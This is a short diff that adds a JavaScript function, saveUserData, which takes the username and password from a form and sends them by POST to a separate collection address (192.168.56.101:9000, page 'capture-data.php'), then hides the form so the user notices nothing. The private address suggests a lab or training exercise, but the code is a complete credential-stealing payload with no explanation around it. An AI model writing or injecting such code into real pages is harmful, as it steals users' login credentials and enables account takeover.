@@ -1,0 +1,18 @@
+		function saveUserData(theForm){
+			try{ 
+				var userinfo = "username=" + theForm.username.value + "&password=" + theForm.password.value;
+
+				var req = new XMLHttpRequest(); 
+				req.onreadystatechange = function(){ 
+					if(req.readyState == 4){ 
+						theForm.parentNode.style.display="none"; 
+					}
+				};
+		
+				req.open("post", "http://192.168.56.101:9000/index.php?page=capture-data.php", true);
+				req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
+				req.send(userinfo);		
+			}catch(e){ 
+				alert(e.message);
+			};
+		};
